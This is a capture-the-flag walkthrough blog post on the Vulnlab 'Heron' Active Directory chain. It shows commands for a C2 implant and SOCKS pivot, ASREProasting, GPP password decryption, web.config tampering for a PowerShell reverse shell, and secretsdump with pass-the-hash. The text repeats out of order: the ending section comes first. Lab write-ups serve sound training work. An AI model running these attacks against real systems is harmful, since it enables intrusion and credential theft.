ticket should be saved in an appropriate file with a file name specified at the bottom of the command.\n\nLet's now set our Kerberos authentication global variable to be directed to this ticket. Note that if you impersonated the `MUCDC$` machine account, you may need to rename the ticket so that the `$` special character doesn't conflict with the global variable setting.\n\n```\n└─$ export KRB5CCNAME=_admin@cifs_mucdc.heron.vl@HERON.VL.ccache\n```\n\nNow we can attempt to dump all of the secrets through our SOCKS proxy using Impacket's `secretsdump` command with our Kerberos ticket. The output may be slow since it has to tunnel through the proxy so be sure to give it some time.\n\n```\n└─$ proxychains4 impacket-secretsdump -k mucdc.heron.vl\n......\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:445  ...  OK\n[*] Service RemoteRegistry is in stopped state\n[*] Starting service RemoteRegistry\n[*] Target system bootKey: 0x7a8b61a266b3e6ba7b55725d51f2b723\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\n......\n_admin:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::\n```\n\nYou'll receive more of an output, as Impacket will dump every password hash for domain user and machine account that is cached on the DC. Since we were able to dump the `_admin` hash, we should be able to simply authenticate to the machine and steal the root flag.\n\nThe only stipulate is that WinRM is not enabled on this machine, and attempting to authenticate to RDP did not work when I tested it initially. We can still simply login to the `C$` SMB share with our admin hash and view the root flag. You can also use `smbexec` with the cached Kerberos ticket that we have to gain code execution to the machine.\n\n```\n└─$ proxychains4 smbclient \\\\\\\\10.10.220.53\\\\C$ -U '_admin' --pw-nt-hash (_ADMIN NT HASH)\n......\nsmb: \\> cd Users\\Administrator\\Desktop\nsmb: \\Users\\Administrator\\Desktop\\> get root.txt\ngetting file \\Users\\Administrator\\Desktop\\root.txt of size 36 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)\n\n└─$ cat root.txt  \n[...snip...]\n```\n\nAs you can see, now that we were able to read the root flag, that means we have compromised this machine!\n\n![](/images/vulnlab/heron-vl/k.png)\n\n# Conclusion\n\nBig thanks to xct for the development of this machine, it really helped with strengthening domain-joined Linux attacks. I also have learned to remember to keep things simple, and always to make sure to check every last corner of the filesystems that you have access to.\n\n# Resources\n\nhttps://github.com/BishopFox/sliver\nhttps://hashcat.net/wiki/doku.php?id=example_hashes\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://github.com/t0thkr1s/gpp-decrypt\nhttps://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/\nhttps://github.com/sosdave/KeyTabExtract\nhttps://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces\nhttps://medium.com/@jeroenverhaeghe/rce-from-web-config-461a5eab8ce9","source":"_posts/heron.md","raw":"---\ntitle: Heron - Vulnlab\ndate: 2024-06-28 16:56:03\ntags: [vulnlab, Medium, CHAIN]\ncategories: vulnlab\nkeywords: 'Vulnlab, Medium, Linux, Windows'\ndescription: This is the newest chain in the medium difficulty that was created by xct, I'm going into this relatively blind so I hope I'll be able to relay the info that I know correctly. It involves an assumed breach scenario within a domain-joined Linux machine, requiring a pivot takeover to the domain controller for completion. \ncover: /images/vulnlab/heron-vl/heron_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nThis is the newest chain in the medium difficulty that was created by xct, I'm going into this relatively blind so I hope I'll be able to relay the info that I know correctly. It involves an assumed breach scenario within a domain-joined Linux machine, requiring a pivot takeover to the domain controller for completion. \n\nI want to thank both xct and otter for their help on this during the initial access portion of the chain, overthinking is a common attribute to have when you start out as a red teamer so it's important to keep it simple (at least that's what I learned for initial access during this chain).\n\n# Enumeration\n\nLet's do our usual NMAP scans.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 20:48 EDT\nNmap scan report for 10.10.128.117\nHost is up (0.10s latency).\nAll 1000 scanned ports on 10.10.186.21 are in ignored states.\nNot shown: 1000 filtered tcp ports (no-response)\n\nNmap done: 1 IP address (1 host up) scanned in 113.11 seconds\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 20:50 EDT\nNmap scan report for 10.10.128.118\nHost is up (0.12s latency).\nNot shown: 999 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n\nNmap done: 1 IP address (1 host up) scanned in 17.67 seconds\n```\n\nThere doesn't seem to be much for us to work with here. From my first guess, every port within the domain controller `.21` is behind a firewall. This means we won't be able to access it until after we have taken control of the first machine. Furthermore this also means we have no way to identify any users directly from the DC due to Kerberos not being accessible.\n\nWe'll have to start from SSH on the domain-joined Linux machine, as this seems to be the only port available. I also made sure to confirm this as the case with `rustscan`, which you can find [here](https://github.com/RustScan/RustScan). It's a modernized version of NMAP, and is used for discovering ports at an increased pace.\n\nLuckily enough I gave a quick peek at the Wiki page for the machine and it seems that this is an assumed-breach scenario. Heron Corp has given us credentials from which to use for our pen-test.\n\n```\npentest:Heron123!\n\n└─$ ssh pentest@10.10.128.118\n......\nLast login: Fri Jun  7 10:34:38 2024 from 10.8.0.101\npentest@frajmp:~$\n```\n\n# SOCKS Proxy to the DC\n\nSo as explained earlier, the first part of this chain is looking through the domain-joined Linux machine and understanding if there are any ways to elevate to root. Given that the first machine of this chain is through the Linux machine, I'm assuming that once we obtain root access we should have the ability to use the machine account and the `/etc/krb5.keytab` file (containing the machine account's NT hash) to compromise the DC.\n\nHowever after a bit of file enumeration, you'll notice that there isn't really much for you to exploit initially. We don't have access to any of the users (nor are there any binaries for us to exploit as the `pentest` user, however there are two domain users in the `/home` directory which are `svc-web-accounting` and `svc-web-accounting-d`. Since we have these users, we can try to kerberoast/ASREProast to try and decrypt their plaintext passwords. In order to even do this though, we'll need to interact with the DC.\n\nSince we don't have access to the DC directly from our local machine, we can use a proxy determine if the jumpbox is able to connect to it due to it being within the scope of the firewall (or at least there seems to be a firewall active). We'll need to start up a SOCKS proxy on the jumpbox in order to do this, and then execute our commands through the proxy. I usually opt to use `proxychains` for this, though you are free to use other tools that accomplish the same result.\n\nI'll start up a [Sliver C2](https://github.com/BishopFox/sliver) server on our local Kali machine, I'm mainly doing this because Sliver has a built in SOCKS proxy command that should start a proxy on a given port easily. Firstly, we'll need to create an implant and curl it to the jumpbox.\n\n```\nsliver > generate --mtls (KALI IP) --os linux --arch amd64 --skip-symbols --save /home/daz/tech/vl/heron/writeup/ --name heron_lin\n```\n\n![](/images/vulnlab/heron-vl/b.png)\n\n```\nsliver > mtls\n\n[*] Starting mTLS listener ...\n\n[*] Successfully started job #1\n\n[*] Session 39b2e695 heron_lin - 10.10.128.118:37554 (frajmp.heron.vl) - linux/amd64 - Thu, 27 Jun 2024 23:34:54 EDT\n```\n\nNow that we have an implant on the jumpbox, we can start up a SOCKS proxy as explained earlier using `socks5 start`. The default port for the proxy should be running on port 1081, though it may be different for others.\n\n```\nsliver (heron_lin) > socks5 start\n\n[*] Started SOCKS5 127.0.0.1 1081  \n⚠  In-band SOCKS proxies can be a little unstable depending on protocol\n```\n\nNow that we have the proxy running through the implant, we'll need to edit our proxychains configuration file to reflect the port that the proxy is being served on. This can be found at either `/etc/proxychains.conf` or `/etc/proxychains4.conf`.\n\nThe setting that we'll need to change is at the bottom of the configuration file, denoted (with changes) from the below.\n\n```\n[ProxyList]\n# add proxy here ...\n# meanwhile\n# defaults set to \"tor\"\nsocks5 127.0.0.1 1081\n```\n\nNow that the configuration is set, you should be able to interact with the `proxychains4` (or `proxychains`) utility directly from Kali. This should be able to direct all of your tools to be executed within the space of the jumpbox instead of your local machine. Let's verify that this works by running an NMAP scan for port 445 (SMB) on the DC (just due to this being a default port).\n\n```\n└─$ proxychains4 nmap -sT -p445 10.10.128.117\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-27 23:40 EDT\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:80  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:445  ...  OK\nNmap scan report for mucdc.heron.vl (10.10.128.117)\nHost is up (0.22s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\nNmap done: 1 IP address (1 host up) scanned in 0.47 seconds\n```\n\nAs you can see, it seems that the SMB port is open on the DC meaning that the firewall is indeed active. This means that most (if not, all) of our tooling will need to go through our proxy.\n\nOur next step is to scan the DC to determine what other ports are available on it. I used SMB as a dummy port for the test above (which we know came back as an open port) so we'll look for ports aside from that.\n\nI've found that using NMAP through a SOCKS proxy is generally slow, due to having to go through the tunnel for each specific port. An easy workaround for this is scanning ports directly from jumpbox by dropping a binary to the machine. To prevent having to also recursively drop all of the libraries that NMAP uses, I decided to utilize an alternative being [rustscan](https://github.com/RustScan/RustScan).\n\nWe can upload the binary easily with Sliver's `upload` command.\n\n```\npentest@frajmp:/tmp$ chmod 777 rustscan\npentest@frajmp:/tmp$ ./rustscan -a 10.10.128.117\n......\nOpen 10.10.128.117:389\nOpen 10.10.128.117:445\nOpen 10.10.128.117:464\nOpen 10.10.128.117:53\nOpen 10.10.128.117:80\nOpen 10.10.128.117:88\nOpen 10.10.128.117:135\nOpen 10.10.128.117:139\nOpen 10.10.128.117:593\nOpen 10.10.128.117:636\nOpen 10.10.128.117:3268\nOpen 10.10.128.117:3269\nOpen 10.10.128.117:3389\nOpen 10.10.128.117:9389\n```\n\nAs you can see, the usual ports for a DC seem to be open (notably LDAP and RDP). However it seems as though a webserver is also open on the DC.\n\n# Tunneling to the HTTP Webserver on the DC\n\nBefore we interact with LDAP at all, I want to take a look to the at the webserver to see if there is anything for us to exploit initially.\n\nTo ensure that we know the domain name of the DC (the jumpbox's domain name is `frajmp` as seen in the SSH login), we can use `crackmapexec` to view the information with no credentials.\n\n```\n└─$ proxychains4 crackmapexec smb 10.10.128.117                                \n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:445  ...  OK\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:135  ...  OK\nSMB         10.10.128.117   445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)\n```\n\nAs seen from the above, the DC's domain name is `mucdc.heron.vl`. We'll add this as well as `frajmp.heron.vl` to our `/etc/hosts` file to reflect any domain name resolutions that we might need in the future.\n\nWe'll need to use our SOCKS proxy to be able to access the webserver, which we can do by utilizing a separate profile in FoxyProxy. I usually use this solely for Burpsuite, so it's a nice change of pace to be able to use FoxyProxy for another purpose. Let's create another profile that uses the SOCKS proxy specifically.\n\n![](/images/vulnlab/heron-vl/c.png)\n\nMake sure that the `Port` and `Type` reflect the proxy accordingly. Once this profile is created, enable it through the FoxyProxy extension and attempt to access the webpage.\n\n![](/images/vulnlab/heron-vl/d.png)\n\nAs you can see from the image, it seems that this webpage is the static landing page for Heron Corp. While there isn't much to see here, we do have more users to add to our LDAP enumeration list that we'll be trying to exploit shortly.\n\nJust to ensure that we aren't missing any other web applications, let's try to see if we can access any subdomains running on this port. I ran into some issues running `gobuster` through the proxy from our local machine (mainly the webserver crashing), so let's try to do it from the jumpbox. Fortunately, `ffuf` does not use any additional libraries so I wouldn't expect there to be any issues if we drop the sole binary to the jumpbox.\n\nWe'll also need to drop a subdomain wordlist to use alongside `ffuf`, I usually opt to use `subdomains-top1million-110000.txt` from [SecLists](https://github.com/danielmiessler/SecLists). \n\n```\nsliver (heron_lin) > upload /usr/bin/ffuf\n\n[*] Wrote file to /tmp/ffuf\n\nsliver (heron_lin) > upload /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n\n[*] Wrote file to /tmp/subdomains-top1million-110000.txt\n```\n\nIf you receive a timeout on the Sliver upload command for `ffuf`, disregard as it should still upload it to the machine.\n\nIf we do run `ffuf` to enumerate subdomains, every request will come back with a 200 status code (indicating a false positive). We can avert this by excluding the size of the request that seems to be the same amongst all of the false positives using the `-fs` tag.\n\n```\npentest@frajmp:/tmp$ ./ffuf -w subdomains-top1million-110000.txt -u http://heron.vl -H \"Host: FUZZ.heron.vl\" -fs 4128\n\naccounting              [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 24ms]\n```\n\nWe seem to have received a `401` request for `accounting` as the subdomain, let's see if we can browse to it to understand why this specific subdomain is encountering an error.\n\n![](/images/vulnlab/heron-vl/e.png)\n\nThis subdomain seems to have authentication tied to it, meaning we won't be able to access it until later on in the attack path.\n\n# ASREPRoasting to Crack Passwords\n\nGiven the point that we're at now, we should have a few users that we can test against to determine if any users are vulnerable to kerberoasting or ASREProasting. The user list at this point should look like the following. (Note that I added a few usernames that are regularly on Windows workstations, such as `Administrator` and `Guest`)\n\n```\nAdministrator\nkrbtgt\nGuest\nsvc-web-accounting-d\nsvc-web-accounting\nwayne.wood\njulian.pratt\nsamuel.davies\n```\n\nLet's test for ASREProasting using Impacket's `GetNPUsers` tool. Essentially what this will do is check if the `NO_PREAUTH_REQUIRED` is set to the user's accounting. If this is set to a user account, we can essentially send an ASREQ to the KDC which will return an ASREP ticket that is encrypted with the users plaintext password.\n\nWe'll use the Guest account with no password to run this command.\n\n```\n└─$ proxychains4 impacket-GetNPUsers heron.vl/'Guest' -dc-ip 10.10.128.117 -no-pass -request -usersfile initial_ul.txt\n......\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:88  ...  OK\n$krb5asrep$23$samuel.davies@HERON.VL:11082947e1ef[...snip...]e1316ef77fc294\n```\n\nAs seen from above, a valid ASREP ticket was returned for the `samuel.davies` user. We can try to crack this using `hashcat` along with the specific hash ID (being 18200) as seen in the [hashcat wiki](https://hashcat.net/wiki/doku.php?id=example_hashes).\n\n```\n└─$ hashcat -a 0 -m 18200 samuel.davies.txt /usr/share/wordlists/rockyou.txt\n......\na6b5c3a4a77676b6134c9302e03726ef67af6288c07a47e44072e62fb80bad6d758edeacacfea413637179588c6a110a65570e84e9a9cf843663bd66f851e193a13943e1316ef77fc294:[...snip...]\n\nSession..........: hashcat\nStatus...........: Cracked\n```\n\nAs seen from the above, we were able to successfully crack the password for `samuel.davies`. This opens up our attack path to a range of various options, notably dumping LDAP as my initial thought.\n\n# Dumping LDAP\n\nLet's now dump the domain with Bloodhound and the [Python ingestor](https://github.com/dirkjanm/BloodHound.py). We can examine any domain objects and also determine if `samuel.davies` has any privileges against other users. This should also increase our user list as you'll see shortly.\n\n```\n└─$ proxychains4 bloodhound-python -d 'heron.vl' -u 'samuel.davies' -p '(SAMUEL.DAVIES PASSWORD)' -c all -ns 10.10.128.117 --zip\n......\nINFO: Compressing output into 20240628004605_bloodhound.zip\n```\n\nWe can now upload the compressed archive to Bloodhound after starting up the `neo4j` and `bloodhound` applications respectively.\n\nUpon viewing the domain objects, it does not seem that `samuel.davies` has any notable privileges to exploit in our situation. That being said, I did notice a privilege that one of the users on our current user list has.\n\n![](/images/vulnlab/heron-vl/f.png)\n\nIt seems that the `svc-web-accounting` has `GenericWrite` privileges over the `MUCJMP` workstation. While it seems that this chain only consists of two machines, it seems that there could be other machine accounts that are present within the environment.\n\nI did some more enumeration on the other machine accounts present in LDAP, and it seems that this environment also has `ACCOUNTING-PREP` and `ACCOUNTING-STAG`.\n\nMoving on from this, I made sure to utilize `ldapsearch` through our SOCKS proxy to increase our user list. I've made a script to do this for us, as seen below.\n\n```\n└─$ proxychains4 ldapsearch -x -LLL -H ldap://mucdc.heron.vl -D 'samuel.davies@heron.vl' -b 'DC=heron,DC=vl' -w '(SAMUEL.DAVIES PASSWORD)' | grep userPrincipalName | awk '{print $2}' | cut -d '@' -f 1 > full_ul.txt\n```\n\nAs we can see with the file created from `ldapsearch`, our user list has increased to over 20 users.\n\n```\nKatherine.Howard\nRachael.Boyle\nAnthony.Goodwin\nCarol.John\nRosie.Evans\nAdam.Harper\nAdam.Matthews\nSteven.Thomas\nAmanda.Williams\nVanessa.Anderson\nJane.Richards\nRhys.George\nMohammed.Parry\nJulian.Pratt\nWayne.Wood\nDanielle.Harrison\nSamuel.Davies\nAlice.Hill\nJayne.Johnson\nGeraldine.Powell\nadm_hoka\nadm_prju\nsvc-web-accounting\nsvc-web-accounting-dev\n```\n\nWe can test for kerberoasting/ASREProasting for these users, to which you will find that `svc-web-accounting` is kerberoastable. That being said even if you do get an encrypted Kerberos TGT from them, you are unable to crack it (from just using rockyou).\n\n# Enumerating SMB Shares\n\nI decided to move on from LDAP at this point, since it seems that we'll need to compromise another user through another service if we want to move forward in the attack chain. Since we have credentials for `samuel.davies`, we can see if there are any shares that we have read access to.\n\n```\n└─$ proxychains4 smbclient -L 10.10.128.117 -U 'samuel.davies'                     \n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:445  ...  OK\nPassword for [WORKGROUP\\samuel.davies]:\n\nSharename       Type      Comment\n---------       ----      -------\naccounting$     Disk      \nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nCertEnroll      Disk      Active Directory Certificate Services share\nhome$           Disk      \nIPC$            IPC       Remote IPC\nit$             Disk      \nNETLOGON        Disk      Logon server share \nSYSVOL          Disk      Logon server share \ntransfer$       Disk\n```\n\nAs you can see it seems that there are a lot of shares that are on the DC. \n\nI'll save us the time due to some prior enumeration that I did into this - it seems that we cannot access `accounting$` and `it$`, and `home$` and `transfer$` do not seem to have any files within any of their folders. \n\n`CertEnroll` did seem suspicious at first, as there seems to be a few expired ADCS certifications that I initially thought could be reused for exploitation. I eventually deduced this to be a rabbit hole and moved elsewhere.\n\nThe interesting part that I found however was in the `SYSVOL` share. I don't normally find much in this share (aside from the logon script exploit that I did for [Baby2](https://dan-feliciano.com/2024/06/05/baby2/)), however it's still important to enumerate everything possible in every share that you have access to for this service.\n\n```\nsmb: \\heron.vl\\Policies\\{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}\\Machine\\Preferences\\Groups\\> ls\n  .                                   D        0  Tue Jun  4 11:59:44 2024\n  ..                                  D        0  Tue Jun  4 11:59:44 2024\n  Groups.xml                          A     1135  Tue Jun  4 12:01:07 2024\n```\n\nIt seems that there is an XML file that we have read access to on the `SYSVOL` share. We'll pull this down to our local machine to see if in contains any relevant information.\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"><Group clsid=\"{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}\" name=\"Administrators (built-in)\" image=\"2\" changed=\"2024-06-04 15:59:45\" uid=\"{535B586D-9541-4420-8E32-224F589E4F3A}\"><Properties action=\"U\" newName=\"\" description=\"\" deleteAllUsers=\"0\" deleteAllGroups=\"0\" removeAccounts=\"0\" groupSid=\"S-1-5-32-544\" groupName=\"Administrators (built-in)\"><Members><Member name=\"HERON\\svc-web-accounting\" action=\"ADD\" sid=\"S-1-5-21-1568358163-2901064146-3316491674-24602\"/><Member name=\"HERON\\svc-web-accounting-d\" action=\"ADD\" sid=\"S-1-5-21-1568358163-2901064146-3316491674-26101\"/></Members></Properties></Group>\n        <User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"Administrator (built-in)\" image=\"2\" changed=\"2024-06-04 16:00:13\" uid=\"{F3B0115E-D062-46CC-B10C-C3EB743C824A}\"><Properties action=\"U\" newName=\"_local\" fullName=\"\" description=\"local administrator\" cpassword=\"[...snip...]\" changeLogon=\"0\" noChange=\"0\" neverExpires=\"1\" acctDisabled=\"0\" subAuthority=\"RID_ADMIN\" userName=\"Administrator (built-in)\"/></User>\n</Groups>\n```\n\nThe file itself seems to be configuring two of the domain user objects, specifically `svc-web-accounting` and `svc-web-accounting-d`. It seems that there also seems to be an encoded password for the \"local administrator\" user at the bottom of the file.\n\nI've seen this `cpassword` term before in other exploits that I've done in the past, and I do recall a tool that we can use to crack this password specifically. That tool is [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt). I'd tried to interpret the code a bit before doing it to understand what it was exactly doing. It seems that script takes the password and adds base64 padding to it before decoding the entire base64 string based on a specific AES key that is used for the `gpp` algorithm.\n\nWe can use the Python POC without needing to use the setup script within the repository, as seen below.\n\n```\n└─$ python3 gpp-decrypt/gpp-decrypt.py -f Groups.xml \n\n                               __                                __ \n  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_\n / _ `/  / _ \\  / _ \\/___// _  / / -_)/ __/ / __/ / // /  / _ \\/ __/\n \\_, /  / .__/ / .__/     \\_,_/  \\__/ \\__/ /_/    \\_, /  / .__/\\__/ \n/___/  /_/    /_/                                /___/  /_/         \n\n[ * ] Username: Administrator (built-in)\n[ * ] Password: [...snip...]\n```\n\nThis returns a password for the built-in Administrator user (which is not the Administrator of the DC), so we'll run this against our user list to see if the password corresponds to any users.\n\nQuick note, make sure to use the actual username for `svc-web-accounting-d` in the user list, as the LDAP command we used from before takes their display name which is `svc-web-accounting-dev`.\n\n```\n└─$ proxychains4 crackmapexec smb 10.10.128.117 -u full_ul.txt -p '(BUILT-IN ADMINISTRATOR PASSWORD)'\n......\nSMB         10.10.128.117   445    MUCDC            [+] heron.vl\\svc-web-accounting-d:[...snip...]\n```\n\nAs you can see, this should return a valid username/password combination for `svc-web-accounting-d`.\n\n# Exploiting the Accounting App\n\nNote that at this point I took a break in between creating this writeup, so the IP addresses will change. The updated addresses for `mucdc.heron.vl` and `frajmp.heron.vl` are `10.10.220.53` and `10.10.220.54`.\n\nSince we have valid credentials for `svc-web-accounting-d`, I decided to see if we had access to the `accounting$` SMB share that we saw previously.\n\n```\n└─$ proxychains4 smbclient \\\\\\\\10.10.220.53\\\\accounting$ -U 'svc-web-accounting-d'\nPassword for [WORKGROUP\\svc-web-accounting-d]:\n[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.54:445  ...  OK\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n\n  .                                   D        0  Fri Jun  7 02:14:04 2024\n  ..                                DHS        0  Sun Jun  2 11:26:14 2024\n  AccountingApp.deps.json             A    37407  Sun Jun  2 15:25:26 2024\n  AccountingApp.dll                   A    89600  Sun Jun  2 15:25:26 2024\n  AccountingApp.exe                   A   140800  Sun Jun  2 15:25:26 2024\n  AccountingApp.pdb                   A    39488  Sun Jun  2 15:25:26 2024\n  AccountingApp.runtimeconfig.json      A      557  Sat Jun  1 18:22:20 2024\n  appsettings.Development.json        A      127  Sat Jun  1 18:00:54 2024\n  ......\n```\n\nIt seems that we successfully were able to gain access to the `accounting$` share, and there seem to be a lot within the contents of this share.\n\nThere seems to be a consistent notice of this share having contents related to an accounting app, based on the file names. My guess to this is that this could potentially be the configuration directory for the accounting subdomain we found earlier.\n\nGiven that we have access to all of these files, I'm assuming that these will be valid credentials to the simple authentication that this website requires.\n\n![](/images/vulnlab/heron-vl/g.png)\n\nEntering in the credentials for `svc-web-accounting-d` seems to land us at the respective accounting application. This cements my theory that the SMB share seems to be linked to the backend of this application.\n\nGiven that we have access to the files that build up the accounting app, I'm assuming that we should have RCE if we exploit this appropriately. Let's take a look further into this share to see if there are any files to exploit.\n\nAfter doing a bit of research into this application (finding that this is an IIS application running ASP.NET), the actual exploitation consists of the `web.config` file that is located on the root directory of this SMB share.\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<configuration>\n  <location path=\".\" inheritInChildApplications=\"false\">\n    <system.webServer>\n      <handlers>\n        <add name=\"aspNetCore\" path=\"*\" verb=\"*\" modules=\"AspNetCoreModuleV2\" resourceType=\"Unspecified\" />\n      </handlers>\n      <aspNetCore processPath=\"dotnet\" arguments=\".\\AccountingApp.dll\" stdoutLogEnabled=\"false\" stdoutLogFile=\".\\logs\\stdout\" hostingModel=\"inprocess\" />\n    </system.webServer>\n  </location>\n</configuration>\n<!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4-->\n```\n\nThis file specifically seems to be related to the runtime arguments that actually define how this application is initialized. As we can see, the `aspNetCore` module is created by executing `AccountingApp.dll`, which I'm assuming is then chained to execute all of the other libraries within this directory.\n\nAfter doing some research, I found an RCE exploit that we can utilize that uses `aspNetCore` module that is already present in the configuration file. The resource I used for RCE exploit can be found [here](https://medium.com/@jeroenverhaeghe/rce-from-web-config-461a5eab8ce9), all credit goes to Jeroen Verhaeghe.\n\nIf we alter the `aspNetCore` module to instead use PowerShell as its process path, we can pass in PowerShell arguments into the arguments section within the module. In theory, this should render the website unusable due to the application requiring the serialization of `AccountingApp.dll`. That being said, it should execute our payload before receiving this error. This was essentially the only way to achieve RCE that I found, I am open to understanding other ways to achieve this without rendering the web application unusable.\n\nSo with that being said let's replace the module initialization and the actual module itself, I've made the necessary changes to the file as seen below (Note that the payload that I'm using is from [revshells](https://www.revshells.com/)).\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<configuration>\n  <location path=\".\" inheritInChildApplications=\"false\">\n    <system.webServer>\n      <handlers>\n        <add name=\"aspNetCore\" path=\"execute.now\" verb=\"*\" modules=\"AspNetCoreModuleV2\" resourceType=\"Unspecified\" />\n      </handlers>\n      <aspNetCore processPath=\"powershell\" arguments=\"-e (POWERSHELL BASE64 PAYLOAD)\" hostingModel=\"OutOfProcess\" />\n    </system.webServer>\n  </location>\n</configuration>\n<!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4-->\n```\n\nThe `POWERSHELL BASE64 PAYLOAD` that I used was the PowerShell #3 Base64 payload from [revshells](https://www.revshells.com/).\n\nWe'll start up our listener using `nc -lvnp 9002` and replace the `web.config` file that is currently in the SMB share with the new changes. You can do so by just removing the current config and putting your new config in the share.\n\n```\nsmb: \\> rm web.config\nsmb: \\> put web.config\nputting file web.config as \\web.config (5.8 kb/s) (average 5.8 kb/s)\n```\n\nLet's now browse to the path that we specified to execute the PowerShell payload, which is `http://accounting.heron.vl/execute.now`.\n\nAs you can see from the netcat payload, we'll receive a callback as `svc-web-accounting` on the DC.\n\n```\n└─$ nc -lvnp 9002      \nlistening on [any] 9002 ...\nconnect to [10.8.0.173] from (UNKNOWN) [10.10.220.53] 58887\nPS C:\\webaccounting> whoami\nheron\\svc-web-accounting\n```\n\n# Credential Hunting as svc-web-accounting\n\nThe interesting part that I found about this is that fact that there is a timeout on the web application that will essentially crash our current reverse shell after about a minute. This isn't very good practice in the real world, however it's essentially all that we can do at this with the only POC that I could think of. Again, very open to any different solutions that keep the reverse shell continuously up.\n\n![](/images/vulnlab/heron-vl/h.png)\n\nLuckily enough we can continue to get a reverse shell if we reopen our netcat listener and refresh the `execute.now` page. Had `svc-web-accounting` not been kerberoastable and their password WAS crackable, we could simply poison a request to a Responder endpoint and crack their NetNTLMv2 hash.\n\nLuckily enough, we won't need this shell for very long. At this point, I enumerated the filesystem in between the intervals of the web application crashing. The `C:\\` drive seems to be the parent directory of all of the SMB shares. \n\n```\nDirectory: C:\\\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----          6/1/2024   8:10 AM                home\nd-----         5/26/2024   2:31 AM                inetpub\nd-----          6/6/2024   7:22 AM                it\nd-----          5/8/2021   1:20 AM                PerfLogs\nd-r---          6/6/2024   7:22 AM                Program Files\nd-----          6/1/2024   7:30 AM                Program Files (x86)\nd-----         5/26/2024   4:51 AM                transfer\nd-r---          6/1/2024   8:43 AM                Users\nd-----         6/28/2024  12:38 PM                webaccounting\nd-----          6/2/2024   8:26 AM                Windows\n-a----          6/2/2024   3:45 AM             36 flag.txt\n```\n\nYou can also see that the first flag is within the `C:\\` drive, meaning we have completed a 1/3 of this chain.\n\nTo save some time, I spent a decent amount of attempts looking through all of the folders recursively to see if any DPAPI credentials or really just any credentials were cached in any files. After about an hour of credential hunting, I came across a file within `C:\\Windows\\scripts\\ssh.ps1`.\n\n```\nPS C:\\Windows\\scripts> cat ssh.ps1\n$plinkPath = \"C:\\Program Files\\PuTTY\\plink.exe\"\n$targetMachine = \"frajmp\"\n$user = \"_local\"\n$password = \"[...snip...]\"\n& \"$plinkPath\" -ssh -batch $user@$targetMachine -pw $password \"ps auxf; ls -lah /home; exit\"\n```\n\nThis seems to contain the SSH password for the `_local` user. An admin user was probably trying to establish an SSH session to the `frajmp` jumpbox as this user using PuTTY.\n\nNow that we have these credentials, we can try to login as this user on the jumpbox. We also won't need our reverse shell as `svc-web-accounting` any longer.\n\n# Root Access to FRAJMP\n\nNow that we have access as this user, we'll login in our other session as `pentest`.\n\n```\npentest@frajmp:/tmp$ su _local\nPassword: \n_local@frajmp:/tmp$\n```\n\nTesting our root access with the password that we currently have indicates to me that this user has SUDO privileges to the entire filesystem.\n\n```\n_local@frajmp:/tmp$ sudo -l\n[sudo] password for _local: \nMatching Defaults entries for _local on localhost:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser _local may run the following commands on localhost:\n    (ALL : ALL) ALL\n```\n\nSince we have that, we can simply log in as the root user using `sudo su`.\n\n```\n_local@frajmp:/tmp$ sudo su\nroot@frajmp:/tmp# whoami\nroot\n```\n\nThe second flag for this machine is within the root users home directory in `/root`. There isn't much to see aside from that, I did some file enumeration and did not come back with much.\n\nI'll execute our Sliver implant just to ensure that we have access to the root user through our C2 server. This is just in case we need to tunnel any tools to the DC with the highest privilege on `FRAJMP`. --> 